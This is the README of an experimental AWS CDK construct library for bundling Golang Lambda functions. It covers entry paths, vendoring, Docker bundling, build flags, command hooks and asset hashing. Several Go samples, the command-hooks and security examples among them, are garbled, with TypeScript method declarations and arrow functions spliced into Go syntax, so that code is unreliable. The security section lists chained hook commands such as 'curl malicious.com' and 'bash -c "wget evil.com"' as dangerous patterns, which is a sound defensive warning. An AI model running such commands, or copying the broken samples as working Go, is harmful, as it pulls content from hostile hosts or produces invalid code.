# Amazon Lambda Golang Library

<!--BEGIN STABILITY BANNER-->---


![cdk-constructs: Experimental](https://img.shields.io/badge/cdk--constructs-experimental-important.svg?style=for-the-badge)

> The APIs of higher level constructs in this module are experimental and under active development.
> They are subject to non-backward compatible changes or removal in any future version. These are
> not subject to the [Semantic Versioning](https://semver.org/) model and breaking changes will be
> announced in the release notes. This means that while you may use them, you may need to update
> your source code when upgrading to a newer version of this package.

---
<!--END STABILITY BANNER-->

This library provides constructs for Golang Lambda functions.

To use this module you will either need to have `Go` installed (`go1.11` or later) or `Docker` installed.
See [Local Bundling](#local-bundling)/[Docker Bundling](#docker-bundling) for more information.

This module also requires that your Golang application is
using a Go version >= 1.11 and is using [Go modules](https://golang.org/ref/mod).

## Go Function

Define a `GoFunction`:

```go
go.NewGoFunction(this, jsii.String("handler"), &GoFunctionProps{
	Entry: jsii.String("lambda-app/cmd/api"),
})
```

By default, if `entry` points to a directory, then the construct will assume there is a Go entry file (i.e. `main.go`).
Let's look at an example Go project:

```bash
lambda-app
├── cmd
│   └── api
│       └── main.go
├── go.mod
├── go.sum
├── pkg
│   ├── auth
│   │   └── auth.go
│   └── middleware
│       └── middleware.go
└── vendor
    ├── github.com
    │   └── aws
    │       └── aws-lambda-go
    └── modules.txt
```

With the above layout I could either provide the `entry` as `lambda-app/cmd/api` or `lambda-app/cmd/api/main.go`, either will work.
When the construct builds the golang binary this will be translated `go build ./cmd/api` & `go build ./cmd/api/main.go` respectively.
The construct will figure out where it needs to run the `go build` command from, in this example it would be from
the `lambda-app` directory. It does this by determining the [mod file path](#mod-file-path), which is explained in the
next section.

### mod file path

The `GoFunction` tries to automatically determine your project root, that is
the root of your golang project. This is usually where the top level `go.mod` file or
`vendor` folder of your project is located. When bundling in a Docker container, the
`moduleDir` is used as the source (`/asset-input`) for the volume mounted in
the container.

The CDK will walk up parent folders starting from
the current working directory until it finds a folder containing a `go.mod` file.

Alternatively, you can specify the `moduleDir` prop manually. In this case you
need to ensure that this path includes `entry` and any module/dependencies used
by your function. Otherwise bundling will fail.

## Runtime

The `GoFunction` can be used with either the `GO_1_X` runtime or the provided runtimes (`PROVIDED`/`PROVIDED_AL2`).
By default it will use the `PROVIDED_AL2` runtime. The `GO_1_X` runtime does not support things like
[Lambda Extensions](https://docs.aws.amazon.com/lambda/latest/dg/using-extensions.html), whereas the provided runtimes do.
The [aws-lambda-go](https://github.com/aws/aws-lambda-go) library has built in support for the provided runtime as long as
you name the handler `bootstrap` (which we do by default).

## Dependencies

The construct will attempt to figure out how to handle the dependencies for your function. It will
do this by determining whether or not you are vendoring your dependencies. It makes this determination
by looking to see if there is a `vendor` folder at the [mod file path](#mod-file-path).

With this information the construct can determine what commands to run. You will
generally fall into two scenarios:

1. You are using vendoring (indicated by the presence of a `vendor` folder)
   In this case `go build` will be run with `-mod=vendor` set
2. You are not using vendoring (indicated by the absence of a `vendor` folder)
   If you are not vendoring then `go build` will be run without `-mod=vendor`
   since the default behavior is to download dependencies

All other properties of `lambda.Function` are supported, see also the [AWS Lambda construct library](https://github.com/aws/aws-cdk/tree/main/packages/aws-cdk-lib/aws-lambda).

## Environment

By default the following environment variables are set for you:

* `GOOS=linux`
* `GOARCH`: based on the target architecture of the Lambda function
* `GO111MODULE=on`

Use the `environment` prop to define additional environment variables when go runs:

```go
go.NewGoFunction(this, jsii.String("handler"), &GoFunctionProps{
	Entry: jsii.String("app/cmd/api"),
	Bundling: &BundlingOptions{
		Environment: map[string]*string{
			"HELLO": jsii.String("WORLD"),
		},
	},
})
```

## Local Bundling

If `Go` is installed locally and the version is >= `go1.11` then it will be used to bundle your code in your environment. Otherwise, bundling will happen in a [Lambda compatible Docker container](https://gallery.ecr.aws/sam/build-provided.al2023) with the Docker platform based on the target architecture of the Lambda function.

For macOS the recommended approach is to install `Go` as Docker volume performance is really poor.

`Go` can be installed by following the [installation docs](https://golang.org/doc/install).

## Docker

To force bundling in a docker container even if `Go` is available in your environment, set the `forceDockerBundling` prop to `true`. This is useful if you want to make sure that your function is built in a consistent Lambda compatible environment.

Use the `buildArgs` prop to pass build arguments when building the bundling image:

```go
go.NewGoFunction(this, jsii.String("handler"), &GoFunctionProps{
	Entry: jsii.String("app/cmd/api"),
	Bundling: &BundlingOptions{
		BuildArgs: map[string]*string{
			"HTTPS_PROXY": jsii.String("https://127.0.0.1:3001"),
		},
	},
})
```

Use the `bundling.dockerImage` prop to use a custom bundling image:

```go
go.NewGoFunction(this, jsii.String("handler"), &GoFunctionProps{
	Entry: jsii.String("app/cmd/api"),
	Bundling: &BundlingOptions{
		DockerImage: awscdk.DockerImage_FromBuild(jsii.String("/path/to/Dockerfile")),
	},
})
```

Use the `bundling.goBuildFlags` prop to pass additional build flags to `go build`:

```go
go.NewGoFunction(this, jsii.String("handler"), &GoFunctionProps{
	Entry: jsii.String("app/cmd/api"),
	Bundling: &BundlingOptions{
		GoBuildFlags: []*string{
			jsii.String("-ldflags \"-s -w\""),
		},
	},
})
```

**⚠️ Security Warning**: Build flags are passed directly to the Go build command and can execute arbitrary commands during bundling. Only use trusted values and avoid flags like `-toolexec` with untrusted arguments. Be especially cautious with third-party CDK constructs that may contain malicious build flags. The CDK will display a warning during synthesis when `goBuildFlags` is used.

By default this construct doesn't use any Go module proxies. This is contrary to
a standard Go installation, which would use the Google proxy by default. To
recreate that behavior, do the following:

```go
go.NewGoFunction(this, jsii.String("GoFunction"), &GoFunctionProps{
	Entry: jsii.String("app/cmd/api"),
	Bundling: &BundlingOptions{
		GoProxies: []*string{
			go.GoFunction_GOOGLE_GOPROXY(),
			jsii.String("direct"),
		},
	},
})
```

You can set additional Docker options to configure the build environment:

```go
go.NewGoFunction(this, jsii.String("GoFunction"), &GoFunctionProps{
	Entry: jsii.String("app/cmd/api"),
	Bundling: &BundlingOptions{
		Network: jsii.String("host"),
		SecurityOpt: jsii.String("no-new-privileges"),
		User: jsii.String("user:group"),
		VolumesFrom: []*string{
			jsii.String("777f7dc92da7"),
		},
		Volumes: []DockerVolume{
			&DockerVolume{
				HostPath: jsii.String("/host-path"),
				ContainerPath: jsii.String("/container-path"),
			},
		},
	},
})
```

## Command hooks

It is possible to run additional commands by specifying the `commandHooks` prop:

```go
// Run additional commands on a GoFunction via `commandHooks` property
// Run additional commands on a GoFunction via `commandHooks` property
go.NewGoFunction(this, jsii.String("handler"), &GoFunctionProps{
	Entry: jsii.String("cmd/api"),
	Bundling: &BundlingOptions{
		CommandHooks: map[string]interface{}{
			// run tests
			(MethodDeclaration beforeBundling(inputDir: string): string[] {
			        return ['go test ./cmd/api -v'];
			      }
					beforeBundling
					inputDir *string
					string[]
					{
						return []*string{
							jsii.String("go test ./cmd/api -v"),
						}
					}),
			(MethodDeclaration afterBundling(inputDir: string, outputDir: string): string[] {
			        return ['echo "Build complete"'];
			      }
					afterBundling
					inputDir *string
					outputDir *string
					string[]
					{
						return []*string{
							jsii.String("echo \"Build complete\""),
						}
					}),
		},
	},
})
```

The following hooks are available:

* `beforeBundling`: runs before all bundling commands
* `afterBundling`: runs after all bundling commands

They all receive the directory containing the `go.mod` file (`inputDir`) and the
directory where the bundled asset will be output (`outputDir`). They must return
an array of commands to run. Commands are chained with `&&`.

The commands will run in the environment in which bundling occurs: inside the
container for Docker bundling or on the host OS for local bundling.

### ⚠️ Security Considerations

**Command hooks execute arbitrary shell commands** during the bundling process. Only use trusted commands:

**Safe patterns (cross-platform):**

```go
go.NewGoFunction(this, jsii.String("SafeFunction"), &GoFunctionProps{
	Entry: jsii.String("cmd/api"),
	Bundling: &BundlingOptions{
		CommandHooks: map[string]interface{}{
			"beforeBundling": () => [
			        'go test ./...',           // ✅ Standard Go commands work on all OS
			        'go mod tidy',             // ✅ Go module commands
			        'make clean',              // ✅ Build tools (if available)
			        'echo "Building app"',     // ✅ Simple output with quotes
			      ],
			"afterBundling": () => ['echo "Build complete"'],
		},
	},
})
```

**Dangerous patterns to avoid:**

*Windows-specific dangers:*

```go
// ❌ Windows-specific dangers
// ❌ Windows-specific dangers
go.NewGoFunction(this, jsii.String("UnsafeWindowsFunction"), &GoFunctionProps{
	Entry: jsii.String("cmd/api"),
	Bundling: &BundlingOptions{
		CommandHooks: map[string]interface{}{
			"beforeBundling": () => [
			        'go test & curl.exe malicious.com',     // ❌ Command chaining with &
			        'echo %USERPROFILE%',                   // ❌ Environment variable expansion
			        'powershell -Command "..."',            // ❌ PowerShell execution
			      ],
			"afterBundling": () => [],
		},
	},
})
```

*Unix/Linux/macOS dangers:*

```go
// ❌ Unix/Linux/macOS dangers
// ❌ Unix/Linux/macOS dangers
go.NewGoFunction(this, jsii.String("UnsafeUnixFunction"), &GoFunctionProps{
	Entry: jsii.String("cmd/api"),
	Bundling: &BundlingOptions{
		CommandHooks: map[string]interface{}{
			"beforeBundling": () => [
			        'go test; curl malicious.com',          // ❌ Command chaining with ;
			        'echo $(whoami)',                       // ❌ Command substitution
			        'bash -c "wget evil.com"',              // ❌ Shell execution
			      ],
			"afterBundling": () => [],
		},
	},
})
```

**When using third-party constructs** that include `GoFunction`:

* Review the construct's source code before use
* Verify what commands it executes via `commandHooks` and `goBuildFlags`
* Only use constructs from trusted publishers
* Test in isolated environments first

The `GoFunction` construct will display CDK warnings during synthesis when potentially unsafe `commandHooks` or `goBuildFlags` are detected.

For more security guidance, see [AWS CDK Security Best Practices](https://docs.aws.amazon.com/cdk/latest/guide/security.html).

## Security Best Practices

### Third-Party Construct Safety

When using third-party CDK constructs that utilize `GoFunction`, exercise caution:

1. **Review source code** - Inspect the construct implementation for `commandHooks` and `goBuildFlags` usage
2. **Verify publishers** - Use constructs only from trusted, verified sources
3. **Pin versions** - Use exact versions to prevent supply chain attacks
4. **Isolated testing** - Test third-party constructs in sandboxed environments

**Before using any third-party construct:**

* Review the construct's source code on GitHub or npm
* Search for `commandHooks` and `goBuildFlags` usage in the code
* Verify no dangerous command patterns are present
* Use exact version pinning to prevent supply chain attacks

The `GoFunction` construct will display CDK warnings during synthesis when potentially unsafe `commandHooks` or `goBuildFlags` are detected.

## Additional considerations

Depending on how you structure your Golang application, you may want to change the `assetHashType` parameter.
By default this parameter is set to `AssetHashType.OUTPUT` which means that the CDK will calculate the asset hash
(and determine whether or not your code has changed) based on the Golang executable that is created.

If you specify `AssetHashType.SOURCE`, the CDK will calculate the asset hash by looking at the folder
that contains your `go.mod` file. If you are deploying a single Lambda function, or you want to redeploy
all of your functions if anything changes, then `AssetHashType.SOURCE` will probably work.

For example, if my app looked like this:

```bash
lambda-app
├── cmd
│   └── api
│       └── main.go
├── go.mod
├── go.sum
└── pkg
    └── auth
        └── auth.go
```

With this structure I would provide the `entry` as `cmd/api` which means that the CDK
will determine that the protect root is `lambda-app` (it contains the `go.mod` file).
Since I only have a single Lambda function, and any update to files within the `lambda-app` directory
should trigger a new deploy, I could specify `AssetHashType.SOURCE`.

On the other hand, if I had a project that deployed multiple Lambda functions, for example:

```bash
lambda-app
├── cmd
│   ├── api
│   │   └── main.go
│   └── anotherApi
│       └── main.go
├── go.mod
├── go.sum
└── pkg
    ├── auth
    │   └── auth.go
    └── middleware
        └── middleware.go
```

Then I would most likely want `AssetHashType.OUTPUT`. With `OUTPUT`
the CDK will only recognize changes if the Golang executable has changed,
and Go only includes dependencies that are used in the executable. So in this case
if `cmd/api` used the `auth` & `middleware` packages, but `cmd/anotherApi` did not, then
an update to `auth` or `middleware` would only trigger an update to the `cmd/api` Lambda
Function.

## Docker based bundling in complex Docker configurations

By default the input and output of Docker based bundling is handled via bind mounts.
In situtations where this does not work, like Docker-in-Docker setups or when using a remote Docker socket, you can configure an alternative, but slower, variant that also works in these situations.

```go
go.NewGoFunction(this, jsii.String("GoFunction"), &GoFunctionProps{
	Entry: jsii.String("app/cmd/api"),
	Bundling: &BundlingOptions{
		BundlingFileAccess: awscdk.BundlingFileAccess_VOLUME_COPY,
	},
})
```
